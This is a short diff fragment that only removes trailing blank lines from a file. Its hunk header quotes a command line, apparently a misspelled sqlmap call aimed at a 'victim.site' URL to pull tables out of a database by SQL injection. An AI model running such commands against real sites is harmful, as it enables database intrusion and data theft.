@@ -81,8 +81,3 @@ sqlamp -u 'http://victim.site/search.php?=1' -D <database name> -T <table name> 
 
 
 
-
-
-
-
-
